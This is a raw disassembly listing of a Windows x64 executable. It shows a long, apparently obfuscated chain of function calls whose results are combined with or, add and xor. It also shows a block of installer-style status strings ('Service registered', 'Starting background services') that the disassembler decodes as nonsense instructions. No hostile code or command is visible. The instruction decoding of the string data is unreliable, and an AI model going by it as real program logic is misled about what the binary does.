   140004495:	48 8d 54 24 10       	lea    0x10(%rsp),%rdx
   14000449a:	e8 31 ea ff ff       	call   0x140002ed0
   14000449f:	09 44 24 08          	or     %eax,0x8(%rsp)
   1400044a3:	48 8b 4c 24 10       	mov    0x10(%rsp),%rcx
   1400044a8:	48 8d 54 24 10       	lea    0x10(%rsp),%rdx
   1400044ad:	e8 f9 eb ff ff       	call   0x1400030ab
   1400044b2:	01 44 24 08          	add    %eax,0x8(%rsp)
   1400044b6:	48 8b 4c 24 10       	mov    0x10(%rsp),%rcx
   1400044bb:	48 8d 54 24 10       	lea    0x10(%rsp),%rdx
   1400044c0:	e8 fc e7 ff ff       	call   0x140002cc1
   1400044c5:	31 44 24 08          	xor    %eax,0x8(%rsp)
   1400044c9:	48 8b 4c 24 10       	mov    0x10(%rsp),%rcx
   1400044ce:	48 8d 54 24 10       	lea    0x10(%rsp),%rdx
   1400044d3:	e8 4d f3 ff ff       	call   0x140003825
   1400044d8:	31 44 24 08          	xor    %eax,0x8(%rsp)
   1400044dc:	48 8b 4c 24 10       	mov    0x10(%rsp),%rcx
   1400044e1:	48 8d 54 24 10       	lea    0x10(%rsp),%rdx
   1400044e6:	e8 6b e4 ff ff       	call   0x140002956
   1400044eb:	31 44 24 08          	xor    %eax,0x8(%rsp)
   1400044ef:	48 8b 4c 24 10       	mov    0x10(%rsp),%rcx
   1400044f4:	48 8d 54 24 10       	lea    0x10(%rsp),%rdx
   1400044f9:	e8 18 f9 ff ff       	call   0x140003e16
   1400044fe:	09 44 24 08          	or     %eax,0x8(%rsp)
   140004502:	48 8b 4c 24 10       	mov    0x10(%rsp),%rcx
   140004507:	48 8d 54 24 10       	lea    0x10(%rsp),%rdx
   14000450c:	e8 32 fa ff ff       	call   0x140003f43
   140004511:	09 44 24 08          	or     %eax,0x8(%rsp)
   140004515:	48 8b 4c 24 10       	mov    0x10(%rsp),%rcx
   14000451a:	48 8d 54 24 10       	lea    0x10(%rsp),%rdx
   14000451f:	e8 30 f9 ff ff       	call   0x140003e54
   140004524:	09 44 24 08          	or     %eax,0x8(%rsp)
   140004528:	48 8b 4c 24 10       	mov    0x10(%rsp),%rcx
   14000452d:	48 8d 54 24 10       	lea    0x10(%rsp),%rdx
   140004532:	e8 51 f5 ff ff       	call   0x140003a88
   140004537:	09 44 24 08          	or     %eax,0x8(%rsp)
   14000453b:	48 8b 4c 24 10       	mov    0x10(%rsp),%rcx
   140004540:	48 8d 54 24 10       	lea    0x10(%rsp),%rdx
   140004545:	e8 b9 de ff ff       	call   0x140002403
   14000454a:	31 44 24 08          	xor    %eax,0x8(%rsp)
   14000454e:	48 8b 4c 24 10       	mov    0x10(%rsp),%rcx
   140004553:	48 8d 54 24 10       	lea    0x10(%rsp),%rdx
   140004558:	e8 b4 ea ff ff       	call   0x140003011
   14000455d:	01 44 24 08          	add    %eax,0x8(%rsp)
   140004561:	48 8b 4c 24 10       	mov    0x10(%rsp),%rcx
   140004566:	48 8d 54 24 10       	lea    0x10(%rsp),%rdx
   14000456b:	e8 e9 dd ff ff       	call   0x140002359
   140004570:	31 44 24 08          	xor    %eax,0x8(%rsp)
   140004574:	48 8b 4c 24 10       	mov    0x10(%rsp),%rcx
   140004579:	48 8d 54 24 10       	lea    0x10(%rsp),%rdx
   14000457e:	e8 b2 ef ff ff       	call   0x140003535
   140004583:	01 44 24 08          	add    %eax,0x8(%rsp)
   140004587:	48 8b 4c 24 10       	mov    0x10(%rsp),%rcx
   14000458c:	48 8d 54 24 10       	lea    0x10(%rsp),%rdx
   140004591:	e8 d2 ea ff ff       	call   0x140003068
   140004596:	01 44 24 08          	add    %eax,0x8(%rsp)
   14000459a:	48 8b 4c 24 10       	mov    0x10(%rsp),%rcx
   14000459f:	48 8d 54 24 10       	lea    0x10(%rsp),%rdx
   1400045a4:	e8 52 f8 ff ff       	call   0x140003dfb
   1400045a9:	31 44 24 08          	xor    %eax,0x8(%rsp)
   1400045ad:	48 8b 4c 24 10       	mov    0x10(%rsp),%rcx
   1400045b2:	48 8d 54 24 10       	lea    0x10(%rsp),%rdx
   1400045b7:	e8 90 f4 ff ff       	call   0x140003a4c
   1400045bc:	09 44 24 08          	or     %eax,0x8(%rsp)
   1400045c0:	48 8b 4c 24 10       	mov    0x10(%rsp),%rcx
   1400045c5:	48 8d 54 24 10       	lea    0x10(%rsp),%rdx
   1400045ca:	e8 dd de ff ff       	call   0x1400024ac
   1400045cf:	31 44 24 08          	xor    %eax,0x8(%rsp)
   1400045d3:	48 8b 4c 24 10       	mov    0x10(%rsp),%rcx
   1400045d8:	48 8d 54 24 10       	lea    0x10(%rsp),%rdx
   1400045dd:	e8 bc e6 ff ff       	call   0x140002c9e
   1400045e2:	01 44 24 08          	add    %eax,0x8(%rsp)
   1400045e6:	48 8b 4c 24 10       	mov    0x10(%rsp),%rcx
   1400045eb:	48 8d 54 24 10       	lea    0x10(%rsp),%rdx
   1400045f0:	e8 b8 eb ff ff       	call   0x1400031ad
   1400045f5:	01 44 24 08          	add    %eax,0x8(%rsp)
   1400045f9:	48 8b 4c 24 10       	mov    0x10(%rsp),%rcx
   1400045fe:	48 8d 54 24 10       	lea    0x10(%rsp),%rdx
   140004603:	e8 77 ee ff ff       	call   0x14000347f
   140004608:	31 44 24 08          	xor    %eax,0x8(%rsp)
   14000460c:	48 8b 4c 24 10       	mov    0x10(%rsp),%rcx
   140004611:	48 8d 54 24 10       	lea    0x10(%rsp),%rdx
   140004616:	e8 62 fa ff ff       	call   0x14000407d
   14000461b:	31 44 24 08          	xor    %eax,0x8(%rsp)
   14000461f:	48 8b 4c 24 10       	mov    0x10(%rsp),%rcx
   140004624:	48 8d 54 24 10       	lea    0x10(%rsp),%rdx
   140004629:	e8 2f e0 ff ff       	call   0x14000265d
   14000462e:	31 44 24 08          	xor    %eax,0x8(%rsp)
   140004632:	48 8b 4c 24 10       	mov    0x10(%rsp),%rcx
   140004637:	48 8d 54 24 10       	lea    0x10(%rsp),%rdx
   14000463c:	e8 52 df ff ff       	call   0x140002593
   140004641:	01 44 24 08          	add    %eax,0x8(%rsp)
   140004645:	48 8b 4c 24 10       	mov    0x10(%rsp),%rcx
   14000464a:	48 8d 54 24 10       	lea    0x10(%rsp),%rdx
   14000464f:	e8 cc dd ff ff       	call   0x140002420
   140004654:	01 44 24 08          	add    %eax,0x8(%rsp)
   140004658:	48 8b 4c 24 10       	mov    0x10(%rsp),%rcx
   14000465d:	48 8d 54 24 10       	lea    0x10(%rsp),%rdx
   140004662:	e8 cf f4 ff ff       	call   0x140003b36
   140004667:	09 44 24 08          	or     %eax,0x8(%rsp)
   14000466b:	48 8b 4c 24 10       	mov    0x10(%rsp),%rcx
   140004670:	48 8d 54 24 10       	lea    0x10(%rsp),%rdx
   140004675:	e8 3f e8 ff ff       	call   0x140002eb9
   14000467a:	31 44 24 08          	xor    %eax,0x8(%rsp)
   14000467e:	48 8b 4c 24 10       	mov    0x10(%rsp),%rcx
   140004683:	48 8d 54 24 10       	lea    0x10(%rsp),%rdx
   140004688:	e8 03 ef ff ff       	call   0x140003590
   14000468d:	01 44 24 08          	add    %eax,0x8(%rsp)
   140004691:	48 8b 4c 24 10       	mov    0x10(%rsp),%rcx
   140004696:	48 8d 54 24 10       	lea    0x10(%rsp),%rdx
   14000469b:	e8 45 f3 ff ff       	call   0x1400039e5
   1400046a0:	01 44 24 08          	add    %eax,0x8(%rsp)
   1400046a4:	48 8b 4c 24 10       	mov    0x10(%rsp),%rcx
   1400046a9:	48 8d 54 24 10       	lea    0x10(%rsp),%rdx
   1400046ae:	e8 a9 e4 ff ff       	call   0x140002b5c
   1400046b3:	01 44 24 08          	add    %eax,0x8(%rsp)
   1400046b7:	48 8b 4c 24 10       	mov    0x10(%rsp),%rcx
   1400046bc:	48 8d 54 24 10       	lea    0x10(%rsp),%rdx
   1400046c1:	e8 16 e9 ff ff       	call   0x140002fdc
   1400046c6:	09 44 24 08          	or     %eax,0x8(%rsp)
   1400046ca:	48 8b 4c 24 10       	mov    0x10(%rsp),%rcx
   1400046cf:	48 8d 54 24 10       	lea    0x10(%rsp),%rdx
   1400046d4:	e8 5e f7 ff ff       	call   0x140003e37
   1400046d9:	09 44 24 08          	or     %eax,0x8(%rsp)
   1400046dd:	48 8b 4c 24 10       	mov    0x10(%rsp),%rcx
   1400046e2:	48 8d 54 24 10       	lea    0x10(%rsp),%rdx
   1400046e7:	e8 e6 e1 ff ff       	call   0x1400028d2
   1400046ec:	09 44 24 08          	or     %eax,0x8(%rsp)
   1400046f0:	48 8b 4c 24 10       	mov    0x10(%rsp),%rcx
   1400046f5:	48 8d 54 24 10       	lea    0x10(%rsp),%rdx
   1400046fa:	e8 95 f9 ff ff       	call   0x140004094
   1400046ff:	09 44 24 08          	or     %eax,0x8(%rsp)
   140004703:	48 8b 4c 24 10       	mov    0x10(%rsp),%rcx
   140004708:	48 8d 54 24 10       	lea    0x10(%rsp),%rdx
   14000470d:	e8 3a f5 ff ff       	call   0x140003c4c
   140004712:	31 44 24 08          	xor    %eax,0x8(%rsp)
   140004716:	48 8b 4c 24 10       	mov    0x10(%rsp),%rcx
   14000471b:	48 8d 54 24 10       	lea    0x10(%rsp),%rdx
   140004720:	e8 55 e8 ff ff       	call   0x140002f7a
   140004725:	31 44 24 08          	xor    %eax,0x8(%rsp)
   140004729:	48 8b 4c 24 10       	mov    0x10(%rsp),%rcx
   14000472e:	48 8d 54 24 10       	lea    0x10(%rsp),%rdx
   140004733:	e8 2a fa ff ff       	call   0x140004162
   140004738:	31 44 24 08          	xor    %eax,0x8(%rsp)
   14000473c:	48 8b 4c 24 10       	mov    0x10(%rsp),%rcx
   140004741:	48 8d 54 24 10       	lea    0x10(%rsp),%rdx
   140004746:	e8 c9 f4 ff ff       	call   0x140003c14
   14000474b:	09 44 24 08          	or     %eax,0x8(%rsp)
   14000474f:	48 8b 4c 24 10       	mov    0x10(%rsp),%rcx
   140004754:	48 8d 54 24 10       	lea    0x10(%rsp),%rdx
   140004759:	e8 53 f0 ff ff       	call   0x1400037b1
   14000475e:	31 44 24 08          	xor    %eax,0x8(%rsp)
   140004762:	48 8b 4c 24 10       	mov    0x10(%rsp),%rcx
   140004767:	48 8d 54 24 10       	lea    0x10(%rsp),%rdx
   14000476c:	e8 e9 ef ff ff       	call   0x14000375a
   140004771:	09 44 24 08          	or     %eax,0x8(%rsp)
   140004775:	48 8b 4c 24 10       	mov    0x10(%rsp),%rcx
   14000477a:	48 8d 54 24 10       	lea    0x10(%rsp),%rdx
   14000477f:	e8 96 e1 ff ff       	call   0x14000291a
   140004784:	09 44 24 08          	or     %eax,0x8(%rsp)
   140004788:	48 8b 4c 24 10       	mov    0x10(%rsp),%rcx
   14000478d:	48 8d 54 24 10       	lea    0x10(%rsp),%rdx
   140004792:	e8 c9 f7 ff ff       	call   0x140003f60
   140004797:	09 44 24 08          	or     %eax,0x8(%rsp)
   14000479b:	48 8b 4c 24 10       	mov    0x10(%rsp),%rcx
   1400047a0:	48 8d 54 24 10       	lea    0x10(%rsp),%rdx
   1400047a5:	e8 be f4 ff ff       	call   0x140003c68
   1400047aa:	01 44 24 08          	add    %eax,0x8(%rsp)
   1400047ae:	48 8b 4c 24 10       	mov    0x10(%rsp),%rcx
   1400047b3:	48 8d 54 24 10       	lea    0x10(%rsp),%rdx
   1400047b8:	e8 c3 f0 ff ff       	call   0x140003880
   1400047bd:	31 44 24 08          	xor    %eax,0x8(%rsp)
   1400047c1:	48 8b 4c 24 10       	mov    0x10(%rsp),%rcx
   1400047c6:	48 8d 54 24 10       	lea    0x10(%rsp),%rdx
   1400047cb:	e8 1b ee ff ff       	call   0x1400035eb
   1400047d0:	31 44 24 08          	xor    %eax,0x8(%rsp)
   1400047d4:	48 8b 4c 24 10       	mov    0x10(%rsp),%rcx
   1400047d9:	48 8d 54 24 10       	lea    0x10(%rsp),%rdx
   1400047de:	e8 48 e7 ff ff       	call   0x140002f2b
   1400047e3:	31 44 24 08          	xor    %eax,0x8(%rsp)
   1400047e7:	48 8b 4c 24 10       	mov    0x10(%rsp),%rcx
   1400047ec:	48 8d 54 24 10       	lea    0x10(%rsp),%rdx
   1400047f1:	e8 b0 f2 ff ff       	call   0x140003aa6
   1400047f6:	31 44 24 08          	xor    %eax,0x8(%rsp)
   1400047fa:	48 8b 4c 24 10       	mov    0x10(%rsp),%rcx
   1400047ff:	48 8d 54 24 10       	lea    0x10(%rsp),%rdx
   140004804:	e8 9b e3 ff ff       	call   0x140002ba4
   140004809:	31 44 24 08          	xor    %eax,0x8(%rsp)
   14000480d:	48 8b 4c 24 10       	mov    0x10(%rsp),%rcx
   140004812:	48 8d 54 24 10       	lea    0x10(%rsp),%rdx
   140004817:	e8 3a ee ff ff       	call   0x140003656
   14000481c:	09 44 24 08          	or     %eax,0x8(%rsp)
   140004820:	48 8b 4c 24 10       	mov    0x10(%rsp),%rcx
   140004825:	48 8d 54 24 10       	lea    0x10(%rsp),%rdx
   14000482a:	e8 97 f3 ff ff       	call   0x140003bc6
   14000482f:	01 44 24 08          	add    %eax,0x8(%rsp)
   140004833:	48 8b 4c 24 10       	mov    0x10(%rsp),%rcx
   140004838:	48 8d 54 24 10       	lea    0x10(%rsp),%rdx
   14000483d:	e8 e3 f4 ff ff       	call   0x140003d25
   140004842:	09 44 24 08          	or     %eax,0x8(%rsp)
   140004846:	48 8b 4c 24 10       	mov    0x10(%rsp),%rcx
   14000484b:	48 8d 54 24 10       	lea    0x10(%rsp),%rdx
   140004850:	e8 7f f0 ff ff       	call   0x1400038d4
   140004855:	01 44 24 08          	add    %eax,0x8(%rsp)
   140004859:	48 8b 4c 24 10       	mov    0x10(%rsp),%rcx
   14000485e:	48 8d 54 24 10       	lea    0x10(%rsp),%rdx
   140004863:	e8 03 f3 ff ff       	call   0x140003b6b
   140004868:	01 44 24 08          	add    %eax,0x8(%rsp)
   14000486c:	48 8b 4c 24 10       	mov    0x10(%rsp),%rcx
   140004871:	48 8d 54 24 10       	lea    0x10(%rsp),%rdx
   140004876:	e8 d2 f2 ff ff       	call   0x140003b4d
   14000487b:	09 44 24 08          	or     %eax,0x8(%rsp)
   14000487f:	48 8b 4c 24 10       	mov    0x10(%rsp),%rcx
   140004884:	48 8d 54 24 10       	lea    0x10(%rsp),%rdx
   140004889:	e8 c4 e8 ff ff       	call   0x140003152
   14000488e:	09 44 24 08          	or     %eax,0x8(%rsp)
   140004892:	8b 44 24 08          	mov    0x8(%rsp),%eax
   140004896:	48 83 c4 28          	add    $0x28,%rsp
   14000489a:	c3                   	ret
   14000489b:	50                   	push   %rax
   14000489c:	6c                   	insb   (%dx),(%rdi)
   14000489d:	65 61                	gs (bad)
   14000489f:	73 65                	jae    0x140004906
   1400048a1:	20 77 61             	and    %dh,0x61(%rdi)
   1400048a4:	69 74 20 77 68 69 6c 	imul   $0x656c6968,0x77(%rax,%riz,1),%esi
   1400048ab:	65 
   1400048ac:	20 77 65             	and    %dh,0x65(%rdi)
   1400048af:	20 70 72             	and    %dh,0x72(%rax)
   1400048b2:	65 70 61             	gs jo  0x140004916
   1400048b5:	72 65                	jb     0x14000491c
   1400048b7:	20 79 6f             	and    %bh,0x6f(%rcx)
   1400048ba:	75 72                	jne    0x14000492e
   1400048bc:	20 69 6e             	and    %ch,0x6e(%rcx)
   1400048bf:	73 74                	jae    0x140004935
   1400048c1:	61                   	(bad)
   1400048c2:	6c                   	insb   (%dx),(%rdi)
   1400048c3:	6c                   	insb   (%dx),(%rdi)
   1400048c4:	61                   	(bad)
   1400048c5:	74 69                	je     0x140004930
   1400048c7:	6f                   	outsl  (%rsi),(%dx)
   1400048c8:	6e                   	outsb  (%rsi),(%dx)
   1400048c9:	0d 0a 00 44 69       	or     $0x6944000a,%eax
   1400048ce:	73 6b                	jae    0x14000493b
   1400048d0:	20 73 70             	and    %dh,0x70(%rbx)
   1400048d3:	61                   	(bad)
   1400048d4:	63 65 20             	movsxd 0x20(%rbp),%esp
   1400048d7:	63 68 65             	movsxd 0x65(%rax),%ebp
   1400048da:	63 6b 20             	movsxd 0x20(%rbx),%ebp
   1400048dd:	70 61                	jo     0x140004940
   1400048df:	73 73                	jae    0x140004954
   1400048e1:	65 64 00 55 70       	gs add %dl,%fs:0x70(%rbp)
   1400048e6:	64 61                	fs (bad)
   1400048e8:	74 69                	je     0x140004953
   1400048ea:	6e                   	outsb  (%rsi),(%dx)
   1400048eb:	67 20 73 68          	and    %dh,0x68(%ebx)
   1400048ef:	6f                   	outsl  (%rsi),(%dx)
   1400048f0:	72 74                	jb     0x140004966
   1400048f2:	63 75 74             	movsxd 0x74(%rbp),%esi
   1400048f5:	20 65 6e             	and    %ah,0x6e(%rbp)
   1400048f8:	74 72                	je     0x14000496c
   1400048fa:	69 65 73 00 53 65 74 	imul   $0x74655300,0x73(%rbp),%esp
   140004901:	75 70                	jne    0x140004973
   140004903:	20 77 69             	and    %dh,0x69(%rdi)
   140004906:	7a 61                	jp     0x140004969
   140004908:	72 64                	jb     0x14000496e
   14000490a:	20 63 6f             	and    %ah,0x6f(%rbx)
   14000490d:	6d                   	insl   (%dx),(%rdi)
   14000490e:	70 6c                	jo     0x14000497c
   140004910:	65 74 65             	gs je  0x140004978
   140004913:	64 0d 0a 00 53 65    	fs or  $0x6553000a,%eax
   140004919:	74 75                	je     0x140004990
   14000491b:	70 20                	jo     0x14000493d
   14000491d:	69 73 20 67 61 74 68 	imul   $0x68746167,0x20(%rbx),%esi
   140004924:	65 72 69             	gs jb  0x140004990
   140004927:	6e                   	outsb  (%rsi),(%dx)
   140004928:	67 20 72 65          	and    %dh,0x65(%edx)
   14000492c:	71 75                	jno    0x1400049a3
   14000492e:	69 72 65 64 20 69 6e 	imul   $0x6e692064,0x65(%rdx),%esi
   140004935:	66 6f                	outsw  (%rsi),(%dx)
   140004937:	72 6d                	jb     0x1400049a6
   140004939:	61                   	(bad)
   14000493a:	74 69                	je     0x1400049a5
   14000493c:	6f                   	outsl  (%rsi),(%dx)
   14000493d:	6e                   	outsb  (%rsi),(%dx)
   14000493e:	00 57 65             	add    %dl,0x65(%rdi)
   140004941:	6c                   	insb   (%dx),(%rdi)
   140004942:	63 6f 6d             	movsxd 0x6d(%rdi),%ebp
   140004945:	65 20 74 6f 20       	and    %dh,%gs:0x20(%rdi,%rbp,2)
   14000494a:	74 68                	je     0x1400049b4
   14000494c:	65 20 61 70          	and    %ah,%gs:0x70(%rcx)
   140004950:	70 6c                	jo     0x1400049be
   140004952:	69 63 61 74 69 6f 6e 	imul   $0x6e6f6974,0x61(%rbx),%esp
   140004959:	20 73 65             	and    %dh,0x65(%rbx)
   14000495c:	74 75                	je     0x1400049d3
   14000495e:	70 00                	jo     0x140004960
   140004960:	55                   	push   %rbp
   140004961:	73 65                	jae    0x1400049c8
   140004963:	72 20                	jb     0x140004985
   140004965:	70 72                	jo     0x1400049d9
   140004967:	6f                   	outsl  (%rsi),(%dx)
   140004968:	66 69 6c 65 20 63 72 	imul   $0x7263,0x20(%rbp,%riz,2),%bp
   14000496f:	65 61                	gs (bad)
   140004971:	74 65                	je     0x1400049d8
   140004973:	64 00 52 65          	add    %dl,%fs:0x65(%rdx)
   140004977:	73 6f                	jae    0x1400049e8
   140004979:	75 72                	jne    0x1400049ed
   14000497b:	63 65 20             	movsxd 0x20(%rbp),%esp
   14000497e:	62 75 6e 64 6c       	(bad)
   140004983:	65 20 6c 6f 61       	and    %ch,%gs:0x61(%rdi,%rbp,2)
   140004988:	64 65 64 00 52 65    	fs gs add %dl,%fs:0x65(%rdx)
   14000498e:	67 69 73 74 65 72 69 	imul   $0x6e697265,0x74(%ebx),%esi
   140004995:	6e 
   140004996:	67 20 66 69          	and    %ah,0x69(%esi)
   14000499a:	6c                   	insb   (%dx),(%rdi)
   14000499b:	65 20 61 73          	and    %ah,%gs:0x73(%rcx)
   14000499f:	73 6f                	jae    0x140004a10
   1400049a1:	63 69 61             	movsxd 0x61(%rcx),%ebp
   1400049a4:	74 69                	je     0x140004a0f
   1400049a6:	6f                   	outsl  (%rsi),(%dx)
   1400049a7:	6e                   	outsb  (%rsi),(%dx)
   1400049a8:	73 00                	jae    0x1400049aa
   1400049aa:	53                   	push   %rbx
   1400049ab:	65 72 76             	gs jb  0x140004a24
   1400049ae:	69 63 65 20 72 65 67 	imul   $0x67657220,0x65(%rbx),%esp
   1400049b5:	69 73 74 65 72 65 64 	imul   $0x64657265,0x74(%rbx),%esi
   1400049bc:	00 43 6f             	add    %al,0x6f(%rbx)
   1400049bf:	6e                   	outsb  (%rsi),(%dx)
   1400049c0:	66 69 67 75 72 61    	imul   $0x6172,0x75(%rdi),%sp
   1400049c6:	74 69                	je     0x140004a31
   1400049c8:	6f                   	outsl  (%rsi),(%dx)
   1400049c9:	6e                   	outsb  (%rsi),(%dx)
   1400049ca:	20 66 69             	and    %ah,0x69(%rsi)
   1400049cd:	6c                   	insb   (%dx),(%rdi)
   1400049ce:	65 20 70 61          	and    %dh,%gs:0x61(%rax)
   1400049d2:	72 73                	jb     0x140004a47
   1400049d4:	65 64 20 73 75       	gs and %dh,%fs:0x75(%rbx)
   1400049d9:	63 63 65             	movsxd 0x65(%rbx),%esp
   1400049dc:	73 73                	jae    0x140004a51
   1400049de:	66 75 6c             	data16 jne 0x140004a4d
   1400049e1:	6c                   	insb   (%dx),(%rdi)
   1400049e2:	79 00                	jns    0x1400049e4
   1400049e4:	4c 6f                	rex.WR outsl (%rsi),(%dx)
   1400049e6:	61                   	(bad)
   1400049e7:	64 69 6e 67 20 75 73 	imul   $0x65737520,%fs:0x67(%rsi),%ebp
   1400049ee:	65 
   1400049ef:	72 20                	jb     0x140004a11
   1400049f1:	70 72                	jo     0x140004a65
   1400049f3:	65 66 65 72 65       	gs data16 gs jb 0x140004a5d
   1400049f8:	6e                   	outsb  (%rsi),(%dx)
   1400049f9:	63 65 73             	movsxd 0x73(%rbp),%esp
   1400049fc:	20 66 72             	and    %ah,0x72(%rsi)
   1400049ff:	6f                   	outsl  (%rsi),(%dx)
   140004a00:	6d                   	insl   (%dx),(%rdi)
   140004a01:	20 63 61             	and    %ah,0x61(%rbx)
   140004a04:	63 68 65             	movsxd 0x65(%rax),%ebp
   140004a07:	00 42 61             	add    %al,0x61(%rdx)
   140004a0a:	63 6b 67             	movsxd 0x67(%rbx),%ebp
   140004a0d:	72 6f                	jb     0x140004a7e
   140004a0f:	75 6e                	jne    0x140004a7f
   140004a11:	64 20 69 6e          	and    %ch,%fs:0x6e(%rcx)
   140004a15:	64 65 78 69          	fs gs js 0x140004a82
   140004a19:	6e                   	outsb  (%rsi),(%dx)
   140004a1a:	67 20 73 74          	and    %dh,0x74(%ebx)
   140004a1e:	61                   	(bad)
   140004a1f:	72 74                	jb     0x140004a95
   140004a21:	65 64 00 4d 65       	gs add %cl,%fs:0x65(%rbp)
   140004a26:	6d                   	insl   (%dx),(%rdi)
   140004a27:	6f                   	outsl  (%rsi),(%dx)
   140004a28:	72 79                	jb     0x140004aa3
   140004a2a:	20 61 6c             	and    %ah,0x6c(%rcx)
   140004a2d:	6c                   	insb   (%dx),(%rdi)
   140004a2e:	6f                   	outsl  (%rsi),(%dx)
   140004a2f:	63 61 74             	movsxd 0x74(%rcx),%esp
   140004a32:	69 6f 6e 20 73 75 63 	imul   $0x63757320,0x6e(%rdi),%ebp
   140004a39:	63 65 65             	movsxd 0x65(%rbp),%esp
   140004a3c:	64 65 64 00 44 69 73 	fs gs add %al,%fs:0x73(%rcx,%rbp,2)
   140004a43:	70 6c                	jo     0x140004ab1
   140004a45:	61                   	(bad)
   140004a46:	79 20                	jns    0x140004a68
   140004a48:	63 6f 6e             	movsxd 0x6e(%rdi),%ebp
   140004a4b:	66 69 67 75 72 61    	imul   $0x6172,0x75(%rdi),%sp
   140004a51:	74 69                	je     0x140004abc
   140004a53:	6f                   	outsl  (%rsi),(%dx)
   140004a54:	6e                   	outsb  (%rsi),(%dx)
   140004a55:	20 6c 6f 61          	and    %ch,0x61(%rdi,%rbp,2)
   140004a59:	64 65 64 00 56 65    	fs gs add %dl,%fs:0x65(%rsi)
   140004a5f:	72 69                	jb     0x140004aca
   140004a61:	66 79 69             	data16 jns 0x140004acd
   140004a64:	6e                   	outsb  (%rsi),(%dx)
   140004a65:	67 20 69 6e          	and    %ch,0x6e(%ecx)
   140004a69:	73 74                	jae    0x140004adf
   140004a6b:	61                   	(bad)
   140004a6c:	6c                   	insb   (%dx),(%rdi)
   140004a6d:	6c                   	insb   (%dx),(%rdi)
   140004a6e:	61                   	(bad)
   140004a6f:	74 69                	je     0x140004ada
   140004a71:	6f                   	outsl  (%rsi),(%dx)
   140004a72:	6e                   	outsb  (%rsi),(%dx)
   140004a73:	20 69 6e             	and    %ch,0x6e(%rcx)
   140004a76:	74 65                	je     0x140004add
   140004a78:	67 72 69             	addr32 jb 0x140004ae4
   140004a7b:	74 79                	je     0x140004af6
   140004a7d:	0d 0a 00 41 70       	or     $0x7041000a,%eax
   140004a82:	70 6c                	jo     0x140004af0
   140004a84:	79 69                	jns    0x140004aef
   140004a86:	6e                   	outsb  (%rsi),(%dx)
   140004a87:	67 20 64 65 66       	and    %ah,0x66(%ebp,%eiz,2)
   140004a8c:	61                   	(bad)
   140004a8d:	75 6c                	jne    0x140004afb
   140004a8f:	74 20                	je     0x140004ab1
   140004a91:	73 65                	jae    0x140004af8
   140004a93:	74 74                	je     0x140004b09
   140004a95:	69 6e 67 73 0d 0a 00 	imul   $0xa0d73,0x67(%rsi),%ebp
   140004a9c:	49 6e                	rex.WB outsb (%rsi),(%dx)
   140004a9e:	69 74 69 61 6c 69 73 	imul   $0x6973696c,0x61(%rcx,%rbp,2),%esi
   140004aa5:	69 
   140004aa6:	6e                   	outsb  (%rsi),(%dx)
   140004aa7:	67 20 61 70          	and    %ah,0x70(%ecx)
   140004aab:	70 6c                	jo     0x140004b19
   140004aad:	69 63 61 74 69 6f 6e 	imul   $0x6e6f6974,0x61(%rbx),%esp
   140004ab4:	20 63 6f             	and    %ah,0x6f(%rbx)
   140004ab7:	6d                   	insl   (%dx),(%rdi)
   140004ab8:	70 6f                	jo     0x140004b29
   140004aba:	6e                   	outsb  (%rsi),(%dx)
   140004abb:	65 6e                	outsb  %gs:(%rsi),(%dx)
   140004abd:	74 73                	je     0x140004b32
   140004abf:	0d 0a 00 43 61       	or     $0x6143000a,%eax
   140004ac4:	63 68 65             	movsxd 0x65(%rax),%ebp
   140004ac7:	20 63 6c             	and    %ah,0x6c(%rbx)
   140004aca:	65 61                	gs (bad)
   140004acc:	72 65                	jb     0x140004b33
   140004ace:	64 20 73 75          	and    %dh,%fs:0x75(%rbx)
   140004ad2:	63 63 65             	movsxd 0x65(%rbx),%esp
   140004ad5:	73 73                	jae    0x140004b4a
   140004ad7:	66 75 6c             	data16 jne 0x140004b46
   140004ada:	6c                   	insb   (%dx),(%rdi)
   140004adb:	79 00                	jns    0x140004add
   140004add:	53                   	push   %rbx
   140004ade:	74 61                	je     0x140004b41
   140004ae0:	72 74                	jb     0x140004b56
   140004ae2:	69 6e 67 20 62 61 63 	imul   $0x63616220,0x67(%rsi),%ebp
   140004ae9:	6b 67 72 6f          	imul   $0x6f,0x72(%rdi),%esp
   140004aed:	75 6e                	jne    0x140004b5d
   140004aef:	64 20 73 65          	and    %dh,%fs:0x65(%rbx)
   140004af3:	72 76                	jb     0x140004b6b
   140004af5:	69 63 65 73 00 52 65 	imul   $0x65520073,0x65(%rbx),%esp
   140004afc:	61                   	(bad)
   140004afd:	64 69 6e 67 20 63 6f 	imul   $0x6e6f6320,%fs:0x67(%rsi),%ebp
   140004b04:	6e 
   140004b05:	66 69 67 75 72 61    	imul   $0x6172,0x75(%rdi),%sp
   140004b0b:	74 69                	je     0x140004b76
   140004b0d:	6f                   	outsl  (%rsi),(%dx)
   140004b0e:	6e                   	outsb  (%rsi),(%dx)
   140004b0f:	20 74 65 6d          	and    %dh,0x6d(%rbp,%riz,2)
   140004b13:	70 6c                	jo     0x140004b81
   140004b15:	61                   	(bad)
   140004b16:	74 65                	je     0x140004b7d
   140004b18:	00 50 72             	add    %dl,0x72(%rax)
   140004b1b:	65 70 61             	gs jo  0x140004b7f
   140004b1e:	72 69                	jb     0x140004b89
   140004b20:	6e                   	outsb  (%rsi),(%dx)
   140004b21:	67 20 75 73          	and    %dh,0x73(%ebp)
   140004b25:	65 72 20             	gs jb  0x140004b48
   140004b28:	69 6e 74 65 72 66 61 	imul   $0x61667265,0x74(%rsi),%ebp
   140004b2f:	63 65 00             	movsxd 0x0(%rbp),%esp
   140004b32:	41 75 64             	rex.B jne 0x140004b99
   140004b35:	69 6f 20 73 75 62 73 	imul   $0x73627573,0x20(%rdi),%ebp
   140004b3c:	79 73                	jns    0x140004bb1
   140004b3e:	74 65                	je     0x140004ba5
   140004b40:	6d                   	insl   (%dx),(%rdi)
   140004b41:	20 72 65             	and    %dh,0x65(%rdx)
   140004b44:	61                   	(bad)
   140004b45:	64 79 0d             	fs jns 0x140004b55
   140004b48:	0a 00                	or     (%rax),%al
   140004b4a:	56                   	push   %rsi
   140004b4b:	61                   	(bad)
   140004b4c:	6c                   	insb   (%dx),(%rdi)
   140004b4d:	69 64 61 74 69 6e 67 	imul   $0x20676e69,0x74(%rcx,%riz,2),%esp
   140004b54:	20 
   140004b55:	73 79                	jae    0x140004bd0
   140004b57:	73 74                	jae    0x140004bcd
   140004b59:	65 6d                	gs insl (%dx),(%rdi)
   140004b5b:	20 72 65             	and    %dh,0x65(%rdx)
   140004b5e:	71 75                	jno    0x140004bd5
   140004b60:	69 72 65 6d 65 6e 74 	imul   $0x746e656d,0x65(%rdx),%esi
   140004b67:	73 0d                	jae    0x140004b76
